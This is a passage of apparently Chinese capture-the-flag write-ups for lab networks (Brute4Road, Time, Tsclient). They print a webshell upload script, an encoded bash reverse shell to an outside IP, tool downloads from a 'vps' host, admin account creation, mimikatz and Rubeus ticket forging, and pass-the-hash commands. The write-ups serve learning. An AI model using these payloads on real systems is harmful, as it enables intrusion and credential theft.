class="hljs-subst">&#123;text&#125;</span>&amp;sizefactor=.090909090909&amp;size=1&amp;filepath=/var/www/html/webshell.php&quot;</span>)<span class="hljs-comment"># We have uploaded a webshell - now let&#x27;s use it to execute a command.</span><span class="hljs-built_in">print</span>(requests.post(    <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;destination_url&#125;</span>webshell.php?1=system&quot;</span>, data=&#123;<span class="hljs-string">&quot;2&quot;</span>: cmd&#125;).content.decode(<span class="hljs-string">&#x27;ascii&#x27;</span>, <span class="hljs-string">&#x27;ignore&#x27;</span>))</code></pre></div><p>蚁剑连接时，连接类型改为<code>CMDLINUX</code>，别问，问就是看wp</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241129180411656.png" alt="image-20241129180411656"></p><p>省时间，直接找到wp-config.php查看数据库用户和密码</p><div class="code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">wpuser</span>WpuserEha8Fgj9</code></pre></div><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241130000349787.png" alt="image-20241130000349787"></p><h2 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h2><p>查看下其他表</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241130000323431.png" alt="image-20241130000323431"></p><p>一堆密码，导出一下，因该是去mssql中爆破出正确密码</p><p>（注意，点到这个表时他的SQL语句会限制输出数量，记得去掉才能输出全部密码</p><p>可以使用fscan进行mssql的密码爆破</p><p>这里注意加<code>-np</code>参数，绕过icmp，因为他不走代理，会导致扫不出来</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241130000703200.png" alt="image-20241130000703200"></p><p>上MDUT</p><p>我才知道原来激活Ole xxx组件后就能上传文件了。。。。</p><p>导致我重启了三次靶机，耗了40分钟思考如何把工具传到机子上</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241130001425658.png" alt="image-20241130001425658"></p><p>然后经典SweetPotato提权</p><p>读取flag03</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241130001721257.png" alt="image-20241130001721257"></p><h2 id="flag04"><a href="#flag04" class="headerlink" title="flag04"></a>flag04</h2><p>开了3389端口，可以rdp上去</p><p>弄一个管理员账号</p><div class="code-wrapper"><pre><code class="hljs sql">net <span class="hljs-keyword">user</span> zeropeach whoami<span class="hljs-variable">@666</span> <span class="hljs-operator">/</span><span class="hljs-keyword">add</span>net localgroup administrators zeropeach <span class="hljs-operator">/</span><span class="hljs-keyword">add</span></code></pre></div><p>看别人都bloodHound信息收集了</p><p>我tm上传后根本运行不了，说是用户不在域中</p><p>看了下，说是机器在域中，但用户不在</p><p>算了偷个图</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241130004855618.png" alt="image-20241130004855618"></p><p>MSSQLSERVER 配置了到域控的约束委派, 可以通过 S4U 伪造高权限 ST 拿下域控</p><p>管理员身份运行mimikatz，抓一下机器账户的哈希</p><p>找到这样一部分就行</p><div class="code-wrapper"><pre><code class="hljs ada">* Username : <span class="hljs-type">MSSQLSERVER</span>$* Domain   : <span class="hljs-type">XIAORANG</span>* NTLM     : <span class="hljs-type">d34af3aa004fa2c45e4ea2b59dde8fbc</span>* SHA1     : 709101<span class="hljs-type">e5535f4c2e0ca6110a14e0808823d456c4</span></code></pre></div><p>使用Rubeus工具 用S4U申请ST票据</p><div class="code-wrapper"><pre><code class="hljs awk">Rubeus.exe asktgt <span class="hljs-regexp">/user:MSSQLSERVER$ /</span>rc4:d34af3aa004fa2c45e4ea2b59dde8fbc <span class="hljs-regexp">/domain:xiaorang.lab /</span>dc:DC.xiaorang.lab /nowrap &gt; <span class="hljs-number">1</span>.txtRubeus.exe s4u <span class="hljs-regexp">/impersonateuser:Administrator /m</span>sdsspn:CIFS<span class="hljs-regexp">/DC.xiaorang.lab /</span>dc:DC.xiaorang.lab <span class="hljs-regexp">/ptt /</span>ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE0I0rsyzHMIDXYZlu5od9ABhtxFsg4WtvnlPLpJUeKphO5B7q8cD9tBq+cnODz47waC<span class="hljs-regexp">/UzZySXgpaOD5WAxp/</span>nPvgVlSnuZpGfVy5HGXAYrABoogaVRpNCynWElBnebY2l7Pc3lpNunu2hDaKJKzA1LzV+z4oYXoHSGKHipZ7OuH4R5shzwazyg86H1dOMVCjP9MgICBbk26BL0sqIHKeyAdAlBTauufl<span class="hljs-regexp">/wZJapI6cmI2xVuyjnWAwPU003+0yMVsWOlAJp7bf+A+4mjjII3eVTVB2u8BfUe/</span>T4kpakhEPrkP2kW5lah6E5P+DTlTwGsOEVdmqxyNKnCg5D42SIP5BBs1k2Gem2B8yF8kkI<span class="hljs-regexp">/jJbmEABeu1BforMzz4dnjYrc4uYSFY8H8wnl4FlGaYdIldP8DR00V7tI/</span>GwvEl4RZ3uQy<span class="hljs-regexp">/RXS8MtT5sJQyTZvcIKD1kDVmH5E1rTGu+ytsmfYEhJ+46yWoi/</span>LNHtaJkY2kZFDKJfsScqdHJXGi9sFHSGzOHTvPenIKXiIOeWcm2e8arG2RtVzbAgiqTIR2tL5rPkLT6MzuzKzK2BBqsSLJubbgErEo7qMZB4Ufccw4j8k3UgVxVXgYOggRNWl39FVdey2Aqaboc6cXU7p8TZ21NEE0KusCZ2MIjkZiIPmbrGmcmC<span class="hljs-regexp">/jSnP6vw5FbmU67UY8G1YTpkZXcBg67pul2kP7g8LtS4zxFEJ2fWYIGGYMW4oaDi57r4G73I7DhUw1Q19uAb6uhz6dPjxSdiD13fjHift21CImXyjR5DSf2PjgShZhVIQrYBzx3Wm9IR8exKqZg2uq8Z5yw6hHs4n+5Ge4z3skVehsE81o+qWGDKo41L4Q/</span>AkQE2q0BxEJirUvaqq9g+DOAra2<span class="hljs-regexp">//</span>+CnOMvYlO26pMTpqjSzzXey6FL4PTpexRrE+h70FJiF5UT7BArx01Fi727NxMlZdGJTXMEUm<span class="hljs-regexp">/oA9BU6WjrbyOULqZNeehpDIOsqnyOuZ0RIfgvmuFpjmLaSp/u</span>p6ELavD933QmNyaJ8JgETVQxSxbk+bitvcuNGmStcqPuPUS5jzpRgiccwp5TUmQH8i2pI+rDmeehraSAgoTZ+w4p3SWuaAoYj5LQg3I6MOmQKvnjpffaWfpxZpN8xzhRpsWLIG7YRrr<span class="hljs-regexp">/1RPfOX9kMVLtWlH1dUrW8RNL7ZVw/</span>rpJ9fUJdlUiHit1oQ<span class="hljs-regexp">/QSTLs7TSi47H4SD9/</span>bHEW9EaXKLCd<span class="hljs-regexp">/a+2vv0rMSqt1i9XzkSKtAltyou8qmWTzjgV0s1NhX5/</span>LTwo0XwNHv5rUbz1meB19iC5+MpLRQSbV12XCk5wEePzC5m8Uuh4I9WNYJ9w<span class="hljs-regexp">/ce3f8W1pAIEp99T1Mq9xkn3xsZ1alLoXi1/</span>sdKHwgNIeJoNdZZaCCeIFr0aizm8opUIz15+<span class="hljs-regexp">/pC5UGjpYXLGiQNq2xSajKcJ0Vydf8z2rQ/</span>nk0LKvzxktO+veagqdm8zLlcQiqv9<span class="hljs-regexp">/nBl2j/</span>SjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBDzHs/yjGOOHZhfZVz2E8txoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI0MTEyOTA4NTQzMlqmERgPMjAyNDExMjkxODU0MzJapxEYDzIwMjQxMjA2MDg1NDMyWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==</code></pre></div><p>这样就成功导入票据</p><p>当然也可以把base64 ticket转为ccache，然后横向过去</p><div class="code-wrapper"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">KRB5CCNAME</span>=ticket.ccacheproxychains4 wmiexec.py DC.xiaorang.lab -k -no-pass -dc-ip 172.22.2.3</code></pre></div><p>就可以访问DC了</p><div class="code-wrapper"><pre><code class="hljs moonscript"><span class="hljs-built_in">type</span> \\DC.xiaorang.lab\c$\users\administrator\flag\flag04.txt</code></pre></div><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241130013345003.png" alt="image-20241130013345003"></p><h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>看了大佬使用红队工具CS或者viper有个集中管理的应用</p><p>但是不会用，就先这样吧</p><p>又没用上bloodhound的一集</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>春秋云镜 Time</title>
    <link href="/2024/11/28/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/"/>
    <url>/2024/11/28/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/</url>
    
    <content type="html"><![CDATA[<h1 id="春秋云镜-Time-writeup"><a href="#春秋云镜-Time-writeup" class="headerlink" title="春秋云镜 Time writeup"></a>春秋云镜 Time writeup</h1><p>继续照着wp复现，学习知识</p><h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><p>fscan扫ip</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">fscan64</span> -h <span class="hljs-number">39.99.236.224</span> -p <span class="hljs-number">1</span>-<span class="hljs-number">65535</span></code></pre></div><p>不指定端口的话好像扫不出来</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/image-20241128193740954.png" alt="image-20241128193740954"></p><p>neo4j数据库，找漏洞</p><p><a href="https://github.com/vulhub/vulhub/tree/master/neo4j/CVE-2021-34371">vulhub&#x2F;neo4j&#x2F;CVE-2021-34371 at master · vulhub&#x2F;vulhub (github.com)</a></p><p>自行打包使用即可</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar rhino_gadget-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>-SNAPSHOT-fatjar.jar rmi://<span class="hljs-number">39.99.236.224:1337</span> <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTguODkuNjEuNzEvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></code></pre></div><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/image-20241128194010182.png" alt="image-20241128194010182"></p><h2 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h2><p>然后上传工具</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmpwget http://vps:1338/frpcwget http://vps:1338/frpc.iniwget http://vps:1338/fscan<span class="hljs-built_in">chmod</span> 777 *</code></pre></div><p>看一下ip</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/image-20241128194156269.png" alt="image-20241128194156269"></p><div class="code-wrapper"><pre><code class="hljs accesslog">./fscan -h <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">6</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span>   ___                              _      / _ \     ___  ___ _ __ __ _  ___| | __  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;    \____/     |___/\___|_|  \__,_|\___|_|\_\                        fscan version: <span class="hljs-number">1</span>.<span class="hljs-number">8</span>.<span class="hljs-number">2</span>start infoscantrying RunIcmp2The current user permissions unable to send icmp packetsstart ping(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">6</span>.<span class="hljs-number">12</span>     is alive(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">6</span>.<span class="hljs-number">25</span>     is alive(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">6</span>.<span class="hljs-number">36</span>     is alive(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">6</span>.<span class="hljs-number">38</span>     is alive<span class="hljs-string">[*]</span> Icmp alive hosts len is: <span class="hljs-number">4</span><span class="hljs-number">172.22.6.12:88</span> open<span class="hljs-number">172.22.6.12:445</span> open<span class="hljs-number">172.22.6.25:445</span> open<span class="hljs-number">172.22.6.25:139</span> open<span class="hljs-number">172.22.6.12:139</span> open<span class="hljs-number">172.22.6.12:135</span> open<span class="hljs-number">172.22.6.25:135</span> open<span class="hljs-number">172.22.6.38:80</span> open<span class="hljs-number">172.22.6.38:22</span> open<span class="hljs-number">172.22.6.36:22</span> open<span class="hljs-number">172.22.6.36:7687</span> open<span class="hljs-string">[*]</span> alive ports len is: <span class="hljs-number">11</span>start vulscan<span class="hljs-string">[*]</span> NetInfo:<span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">6</span>.<span class="hljs-number">25</span>   <span class="hljs-string">[-&gt;]</span>WIN2019   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">6</span>.<span class="hljs-number">25</span><span class="hljs-string">[*]</span> NetInfo:<span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">6</span>.<span class="hljs-number">12</span>   <span class="hljs-string">[-&gt;]</span>DC-PROGAME   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">6</span>.<span class="hljs-number">12</span><span class="hljs-string">[*]</span> WebTitle: http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">6</span>.<span class="hljs-number">38</span>        code:<span class="hljs-number">200</span> len:<span class="hljs-number">1531</span>   title:后台登录<span class="hljs-string">[*]</span> NetBios: <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">6</span>.<span class="hljs-number">12</span>     <span class="hljs-string">[+]</span>DC DC-PROGAME.xiaorang.lab       Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span> <span class="hljs-string">[*]</span> NetBios: <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">6</span>.<span class="hljs-number">25</span>     XIAORANG\WIN2019               <span class="hljs-string">[*]</span> <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">6</span>.<span class="hljs-number">12</span>  (Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span>)<span class="hljs-string">[*]</span> WebTitle: https://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">6</span>.<span class="hljs-number">36</span>:<span class="hljs-number">7687</span>  code:<span class="hljs-number">400</span> len:<span class="hljs-number">50</span>     title:None已完成 <span class="hljs-number">11</span>/<span class="hljs-number">11</span><span class="hljs-string">[*]</span> 扫描结束,耗时: <span class="hljs-number">14</span>.220446968s</code></pre></div><div class="code-wrapper"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.6.12</span> #DC-PROGAME.xiaorang.lab<span class="hljs-number">172.22.6.25</span> #XIAORANG\WIN2019<span class="hljs-number">172.22.6.36</span> #本机<span class="hljs-number">172.22.6.38</span> #linux</code></pre></div><p>看172.22.6.38</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/image-20241128194432065.png" alt="image-20241128194432065"></p><p>看wp，是sql注入，上sqlmap （好慢</p><div class="code-wrapper"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -r <span class="hljs-number">1</span><span class="hljs-selector-class">.txt</span> -D oa_db -T oa_f1Agggg <span class="hljs-attr">--dump</span></code></pre></div><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/image-20241128194606905.png" alt="image-20241128194606905"></p><h2 id="flag03-flag04"><a href="#flag03-flag04" class="headerlink" title="flag03 &amp; flag04"></a>flag03 &amp; flag04</h2><p>看一下其他表</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/image-20241128194621709.png" alt="image-20241128194621709"></p><p>考虑枚举域内用户</p><p>提取出email列中的数据出来</p><p>用工具爆破</p><div class="code-wrapper"><pre><code class="hljs stylus">kerbrute_windows_amd64 userenum <span class="hljs-attr">--dc</span> <span class="hljs-number">172.22</span>.<span class="hljs-number">6.12</span> -d xiaorang<span class="hljs-selector-class">.lab</span> ~/users<span class="hljs-selector-class">.txt</span> -o output.txt</code></pre></div><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/image-20241128194751012.png" alt="image-20241128194751012"></p><p>写WP时发现点错误，查数据库时user表有500个，但只显示了后面256个</p><p>需要找到csv表自己手动正则</p><p><code>C:\Users\86136\AppData\Local\sqlmap\output\172.22.6.38\dump\oa_db\oa_users.csv</code></p><p>但不影响后面的图，做题时由于sqlmap跑太慢了，我直接把wp中的有效用户直接拿来了</p><h3 id="AS-REPRoasting"><a href="#AS-REPRoasting" class="headerlink" title="AS-REPRoasting"></a>AS-REPRoasting</h3><p>在AS_REP阶段，会返回由我们请求的域账户hash加密某个值后返回。然后我们通过自身的ntlm hash去解密得到数据。在这里设置不要求预身份验证后，我们可以在AS_REQ阶段，填写想要伪造请求的用户名，随后会用伪造请求的用户名NTLM Hash加密返回给我们。随后我们就可以拿去爆破了</p><div class="code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">python</span> GetNPUsers.py -dc-ip <span class="hljs-number">172.22.6.12</span> -usersfile user.txt xiaorang.lab/</code></pre></div><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/image-20241128195029705.png" alt="image-20241128195029705"></p><p>拿到hashcat去跑</p><div class="code-wrapper"><pre><code class="hljs stylus">hashcat -<span class="hljs-selector-tag">a</span> <span class="hljs-number">0</span> -m <span class="hljs-number">18200</span> user<span class="hljs-selector-class">.txt</span> rockyou<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--force</span></code></pre></div><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/image-20241128200055999.png" alt="image-20241128200055999"></p><div class="code-wrapper"><pre><code class="hljs ada">zhangxin@xiaorang.lab : <span class="hljs-type">strawberry</span>wenshao@xiaorang.lab : <span class="hljs-type">hellokitty</span></code></pre></div><p>爆破一下rdp</p><p>上一期的win版crackmapexec指定不了协议，不会用，换了一个</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> cme rdp <span class="hljs-number">172.22.6.1</span>/<span class="hljs-number">24</span> -u zhangxin -p strawberry -d xiaorang.lab</code></pre></div><p>用哪个用户都行</p><p>最后爆出来的都是172.22.6.25这台</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/image-20241128200235558.png" alt="image-20241128200235558"></p><p>然后就能连上去</p><p>连上去后进行信息收集</p><div class="code-wrapper"><pre><code class="hljs r">SharpHound.exe <span class="hljs-operator">-</span><span class="hljs-built_in">c</span> <span class="hljs-built_in">all</span></code></pre></div><p>拿到zip包，启动bloodhound上传分析</p><p>操蛋的是一直加载不出来</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/image-20241128200920933.png" alt="image-20241128200920933"></p><p>偷个图</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/202308021602620.png" alt="image-20230802160246577"></p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/image-20241128201113223.png" alt="image-20241128201113223"></p><h3 id="SID-History"><a href="#SID-History" class="headerlink" title="SID History"></a>SID History</h3><p>如果将A域中的域用户迁移到B域中，那么在B域中该用户的SID会随之改变，进而影响迁移后用户的权限，导致迁移后的用户不能访问本来可以访问的资源。SID History的作用是在域迁移过程中保持域用户的访问权限，即如果迁移后用户的SID改变了，系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源。</p><h3 id="继续"><a href="#继续" class="headerlink" title="继续"></a>继续</h3><p>简单来说yuxuan属于域管，所以现在拿到yuxuan的权限然后dump哈希就好了</p><p>看X1r0z佬说了<code>WinPEARS</code>，但我怎么找不到呢</p><p>按照名字找了个<a href="https://github.com/peass-ng/PEASS-ng/releases/tag/20241101-6f46e855">Release Release refs&#x2F;heads&#x2F;master 20241101-6f46e855 · peass-ng&#x2F;PEASS-ng (github.com)</a></p><p>用exe的不行，用bat找到点东西</p><div class="code-wrapper"><pre><code class="hljs moonscript">Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon    LastUsedUsername    REG_SZ    yuxuan    DefaultUserName    REG_SZ    yuxuan    DefaultPassword    REG_SZ    Yuxuan7QbrgZ3L    DefaultDomainName    REG_SZ    xiaorang.lab</code></pre></div><p>yuxuan是自动登录账户</p><p>rdp登录yuxuan</p><p>然后传mimikatz上去dump域管hash即可</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/image-20241128201605505.png" alt="image-20241128201605505"></p><p>然后就可以到处横向了</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> psexec.py -hashes :<span class="hljs-number">04</span>d93ffd6f5f6e4490e0de23f240a5e9 xiaorang.lab/administrator@<span class="hljs-number">172.22.6.25</span> -codec gbk</code></pre></div><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/image-20241128201710102.png" alt="image-20241128201710102"></p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> psexec.py -hashes :<span class="hljs-number">04</span>d93ffd6f5f6e4490e0de23f240a5e9 xiaorang.lab/administrator@<span class="hljs-number">172.22.6.12</span> -codec gbk</code></pre></div><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/image-20241128201717876.png" alt="image-20241128201717876"></p><h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>又收获两个知识点</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>春秋云镜 Tsclient</title>
    <link href="/2024/11/28/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/"/>
    <url>/2024/11/28/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/</url>
    
    <content type="html"><![CDATA[<h1 id="春秋云镜-TsClient-writeup"><a href="#春秋云镜-TsClient-writeup" class="headerlink" title="春秋云镜 TsClient writeup"></a>春秋云镜 TsClient writeup</h1><p>学习一下如何打内网渗透</p><p>基本上是对着多个wp操作的，在过程中理解知识并且实际操作一次比纸上谈兵要好</p><p>而且能够找到自己最舒服的操作，比如本人全过程使用windows环境（bloodhound什么的没学到，后面再说）</p><h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><p>fscan扫ip</p><div class="code-wrapper"><pre><code class="hljs fallback">[*] NetInfo:[*]39.99.141.107   [-&gt;]WIN-WEB   [-&gt;]172.22.8.18   [-&gt;]2001:0:348b:fb58:4f2:1ea1:d89c:7294[+] mssql:39.99.141.107:1433:sa 1qaz!QAZ</code></pre></div><p>发现mssql数据库的密码</p><p>使用MDUT进行利用</p><p>第一次要激活xp_cmdshell组件才能执行命令</p><p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/image-20241128013136601.png" alt="image-20241128013136601"></p><p>然后考虑potato提权</p><p>用的是<a href="http://github.com/uknowsec/SweetPotato%E7%9A%84%E5%9C%9F%E8%B1%86">http://github.com/uknowsec/SweetPotato的土豆</a></p><div class="code-wrapper"><pre><code class="hljs vim">certutil -urlcache -<span class="hljs-keyword">split</span> -<span class="hljs-keyword">f</span> http://vp<span class="hljs-variable">s:8000</span>/SweetPotato.<span class="hljs-keyword">exe</span> C:\windows\temp\SweetPotato.<span class="hljs-keyword">exe</span></code></pre></div><p>可以下载到两处地方</p><div class="code-wrapper"><pre><code class="hljs vbnet"><span class="hljs-symbol">C:</span>\windows\temp\<span class="hljs-symbol">C:</span>\Users\<span class="hljs-keyword">public</span>\</code></pre></div><p>然后上传msf的反弹shell，利用system权限去执行</p><p>我使用frp端口转发到本地</p><p>msf拿到shell后在<code>C:\Users\Administrator\flag</code>下找到<code>flag01.txt</code></p><div class="code-wrapper"><pre><code class="hljs livescript">type flag01.txt _________  ________  ________  ___       ___  _______   ________   _________|<span class="hljs-string">\___</span>   ___<span class="hljs-string">\\</span>   ____<span class="hljs-string">\|\</span>   ____<span class="hljs-string">\|\</span>  <span class="hljs-string">\</span>     |<span class="hljs-string">\</span>  <span class="hljs-string">\|\</span>  ___ <span class="hljs-string">\</span> |<span class="hljs-string">\</span>   ___  <span class="hljs-string">\|\___</span>   ___<span class="hljs-string">\</span><span class="hljs-string">\|___</span> <span class="hljs-string">\</span>  <span class="hljs-string">\_\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\___|\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\___|\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span>    <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span> <span class="hljs-string">\</span>   __/|<span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\|___</span> <span class="hljs-string">\</span>  <span class="hljs-string">\_|</span>     <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_____</span>  <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span>    <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span>    <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\_|/_\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span>   <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span>      <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span> <span class="hljs-string">\|____|\</span>  <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\____\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\____\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\_|\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span>   <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span>       <span class="hljs-string">\</span> <span class="hljs-string">\__\</span>  ____<span class="hljs-string">\_\</span>  <span class="hljs-string">\</span> <span class="hljs-string">\_______\</span> <span class="hljs-string">\_______\</span> <span class="hljs-string">\__\</span> <span class="hljs-string">\_______\</span> <span class="hljs-string">\__\\</span> <span class="hljs-string">\__\</span>   <span class="hljs-string">\</span> <span class="hljs-string">\__\</span>        <span class="hljs-string">\|__|</span> |<span class="hljs-string">\_________\|_______|\|_______|\|__|\|_______|\|__|</span> <span class="hljs-string">\|__|</span>    <span class="hljs-string">\|__|</span>              <span class="hljs-string">\|_________|</span>Getting flag01 <span class="hljs-keyword">is</span> easy, right?flag01: flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;Maybe you should focus <span class="hljs-literal">on</span> user sessions...</code></pre></div><h2 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h2><p>上传一个fscan，然后扫内网</p><div class="code-wrapper"><pre><code class="hljs accesslog">fscan -h <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span>   ___                              _  / _ \     ___  ___ _ __ __ _  ___| | __ / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;\____/     |___/\___|_|  \__,_|\___|_|\_\                     fscan version: <span class="hljs-number">1</span>.<span class="hljs-number">8</span>.<span class="hljs-number">2</span>start infoscan(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">18</span>     is alive(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">31</span>     is alive(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">15</span>     is alive(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">46</span>     is alive<span class="hljs-string">[*]</span> Icmp alive hosts len is: <span class="hljs-number">4</span><span class="hljs-number">172.22.8.46:445</span> open<span 